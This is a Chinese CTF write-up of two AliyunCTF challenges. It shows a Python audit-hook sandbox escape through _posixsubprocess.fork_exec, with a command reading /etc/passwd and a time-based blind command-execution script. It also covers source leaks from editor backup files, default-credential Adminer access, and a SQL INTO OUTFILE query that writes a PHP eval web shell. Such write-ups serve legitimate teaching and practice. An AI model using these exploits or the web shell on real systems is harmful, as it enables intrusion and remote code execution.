# 记录AliyunCTF的一道PyJail-先知社区

> **来源**: https://xz.aliyun.com/news/17011  
> **文章ID**: 17011

---

## 

## ezoj

### 绕过audit hook

首先我们先了解一下hook函数中的事件参数包括哪些，才能有效针对绕过  
Python 中的审计事件包括但不限于以下几类：

* `import`：发生在导入模块时。
* `open`：发生在打开文件时。
* `exec`：发生在执行Python代码时。
* `compile`：发生在编译Python代码时。
* `socket`：发生在创建或使用网络套接字时。
* `os.system`，`os.popen`等：发生在执行操作系统命令时。
* `subprocess.Popen`，`subprocess.run`等：发生在启动子进程时

更多的可以看python官方文档：[审计事件表 — Python 3.8.20 文档](https://docs.python.org/zh-cn/3.8/library/audit_events.html)

可以看到基本所有的危险操作都会被hook函数所检查到，audithook 构建沙箱,属于 python 底层的实现,因此常规的变换根本无法绕过.

1. 通过导入模块操作都会触发audit hook比如

```
> import ctypes
```

1. 通过命令执行函数一样会触发audit hook比如

```
os  subproccess  exec等函数
```

#### posixsubprocess模块

posixsubprocess 模块是 Python 的内部模块，提供了一个用于在 UNIX 平台上创建子进程的低级别接口。subprocess 模块的实现就用到了 `_posixsubprocess`

```
import subprocess

# 执行命令
process = subprocess.Popen(["ls", "-l"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

# 获取输出
stdout, stderr = process.communicate()

# 输出结果
print("标准输出:", stdout)
```

![b721d14cff5994a25ab37e8b6ae6261b.png](images/4eee538b-cbce-35e0-b4dd-1ec2e7091bb5)  
该模块的核心功能是 fork\_exec 函数，fork\_exec 提供了一个非常底层的方式来创建一个新的子进程，并在这个新进程中执行一个指定的程序。但这个模块并没有在 Python 的标准库文档中列出,每个版本的 Python 可能有所差异

```
import sys  
from _typeshed import StrOrBytesPath  
from collections.abc import Callable, Sequence  
from typing_extensions import SupportsIndex  
  
if sys.platform != "win32":  
    def cloexec_pipe() -> tuple[int, int]: ...  
    def fork_exec(  
        __args: Sequence[StrOrBytesPath] | None,  
        __executable_list: Sequence[bytes],  
        __close_fds: bool,  
        __pass_fds: tuple[int, ...],  
        __cwd: str,  
        __env: Sequence[bytes] | None,  
        __p2cread: int,  
        __p2cwrite: int,  
        __c2pread: int,  
        __c2pwrite: int,  
        __errread: int,  
        __errwrite: int,  
        __errpipe_read: int,  
        __errpipe_write: int,  
        __restore_signals: int,  
        __call_setsid: int,  
        __pgid_to_set: int,  
        __gid: SupportsIndex | None,  
        __extra_groups: list[int] | None,  
        __uid: SupportsIndex | None,  
        __child_umask: int,  
        __preexec_fn: Callable[[], None],  
        __allow_vfork: bool,  
    ) -> int: ...
```

下面是一个最小化示例:

```
import os
import _posixsubprocess

_posixsubprocess.fork_exec([b"/bin/cat","/etc/passwd"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)
```

#### /bin/sh的用法

`/bin/sh` 是 Unix/Linux 系统中默认的 **Shell 解释器**，通常指向系统的默认 Shell（如 Bash、Dash 等）。它用于执行 Shell 脚本或直接运行命令。以下是关于 `/bin/sh` 的详细用法：

可以通过 `/bin/sh` 直接执行单条命令：

```
/bin/sh -c "ls"
```

不出网时间盲注命令执行

```
import requests
import time
session = requests.session()
burp0_url = "http://121.41.238.106:37640/api/submit"

for k in range(1,128):
    k=chr(k)
    poc= f"if [ `ls / | awk NR==1 | cut -c 1` == {k} ];then sleep 2;fi"
    payload=f'''import os
import _posixsubprocess

_posixsubprocess.fork_exec([b"/bin/sh","-c","{poc}"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)
'''
    burp0_json={"code": payload, "problem_id": "0"}
    time_start=time.time()
    session.post(burp0_url, json=burp0_json)
    time_send=time.time()
    if time_send-time_start>1.5:
        print(k)

```

## okphp

通过扫描目录发现备份文件`index.php~`  
`index.php~` 是类Unix系统中文本编辑器（如Vim）生成的备份文件。若服务器配置不当，攻击者可直接访问此类文件，导致源码泄露，可能暴露敏感信息  
![5ff9da6a2b77a4071343f7a9c17ab924.png](images/d95be2d9-517a-3314-8b00-91e145a2116f)  
通过此泄露发现网站全部源码  
login.php

```
<?php
$servername = "localhost";
$username = "web";
$password = "web";
$dbname = "web";
$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("连接失败: " . $conn->connect_error);
}
session_start();
include './pass.php';
if (isset($_POST['username']) and isset($_POST['password'])) {
    $username = addslashes($_POST['username']);
    $password = $_POST['password'];
    $code = $_POST['code'];
    $endpass = md5($code . $password) . ':' . $code;
    $sql = "select password from users where username='$username'";
    $result = $conn->query($sql);
    if ($result->num_rows > 0) {
        while ($row = $result->fetch_assoc()) {
            if ($endpass == $row['password']) {
                $_SESSION['login'] = 1;
                $_SESSION['username'] = md5($username);
                echo "<script>alert("Welcome $username!");window.location.href="./index.php";</script>";
            }
        }
    } else {
        echo "<script>alert("错误");</script>";
        die();
    }
    $conn->close();
}


```

pass.php

```
<?php
class mypass
{
    public function generateRandomString($length = 10)
    {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';

        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }

        return $randomString;
    }
    public function checkpass($plain)
    {
        $password = $this->generateRandomString();
        $salt = substr(md5($password), 0, 5);
        $password = md5($salt . $plain) . ':' . $salt;
        return $password;
    }
}

```

index.php

```
<?php
session_start();
if ($_SESSION['login'] != 1) {
    echo "<script>alert("Please login!");window.location.href="./login.php";</script>";
    return;
}
?>
<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>鎵撳崱绯荤粺</title>
    <meta name="keywords" content="HTML5 Template">
    <meta name="description" content="Forum - Responsive HTML5 Template">
    <meta name="author" content="Forum">
    <link rel="shortcut icon" href="favicon/favicon.ico">
    <meta name="format-detection" content="telephone=no">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="css/style.css">
</head>

<body>
    <!-- tt-mobile menu -->
    <nav class="panel-menu" id="mobile-menu">
        <ul>

        </ul>
        <div class="mm-navbtn-names">
            <div class="mm-closebtn">
                Close
                <div class="tt-icon">
                    <svg>
                        <use xlink:href="#icon-cancel"></use>
                    </svg>
                </div>
            </div>
            <div class="mm-backbtn">Back</div>
        </div>
    </nav>

    <main id="tt-pageContent">
        <div class="container">
            <div class="tt-wrapper-inner">
                <h1 class="tt-title-border">
                    琛ュ崱绯荤粺
                </h1>
                <form class="form-default form-create-topic" action="./index.php" method="POST">
                    <div class="form-group">
                        <label for="inputTopicTitle">濮撳悕</label>
                        <div class="tt-value-wrapper">
                            <input type="text" name="username" class="form-control" id="inputTopicTitle" placeholder="<?php echo $_SESSION['username']; ?>">
                        </div>

                    </div>

                    <div class="pt-editor">
                        <h6 class="pt-title">琛ュ崱鍘熷洜</h6>

                        <div class="form-group">
                            <textarea name="reason" class="form-control" rows="5" placeholder="Lets get started"></textarea>
                        </div>

                        <div class="row">
                            <div class="col-auto ml-md-auto">
                                <button class="btn btn-secondary btn-width-lg">鎻愪氦</button>
                            </div>
                        </div>
                    </div>
                </form>
            </div>

        </div>
    </main>
</body>

</html>
<?php
include './cache.php';
$check = new checkin();
if (isset($_POST['reason'])) {
    if (isset($_GET['debug_buka'])) {
        $time = date($_GET['debug_buka']);
    } else {
        $time = date("Y-m-d H:i:s");
    }
    $arraya = serialize(array("name" => $_SESSION['username'], "reason" => $_POST['reason'], "time" => $time, "background" => "ok"));
    $check->writec($_SESSION['username'] . '-' . date("Y-m-d"), $arraya);
}
if (isset($_GET['check'])) {
    $cachefile = '/var/www/html/cache/' . $_SESSION['username'] . '-' . date("Y-m-d") . '.php';
    if (is_file($cachefile)) {
        $data = file_get_contents($cachefile);
        $checkdata = unserialize(str_replace("<?php exit;//", '', $data));
        $check = "/var/www/html/" . $checkdata['background'] . ".php";
        include "$check";
    } else {
        include 'error.php';
    }
}
?>
```

后来发现应该是被非预期了感觉，直接在`ok.php~`中泄露了`adminer_481.php`访问发现是一个数据库管理网页  
![6bb054ba3d715932d72f4eae98caaa7d.png](images/25656a83-a641-3552-ac51-514e6c3fce03)  
我们通过默认root root密码登录进来看一下配置文件写入权限

```
show variables like "%secure%"
```

![bc8e2a1d2dd3c0bf481b484506e1aa8b.png](images/bf5953a2-9086-31f9-8593-7bea2f074252)

可以直接执行sql写shell

```
select "<?php eval($_POST[1]);" into outfile '/var/www/html/a.php'
```

![e67f59e3aa0dd206910fc8568f0961bb.png](images/87de92dc-fb39-32ac-aa2c-3a6f385721fa)  
最终访问执行命令RCE  
![46c18a0607f0f7b694e2ef46ee1db91d.png](images/e21a61ec-7629-3aed-b483-34a66deaa932)
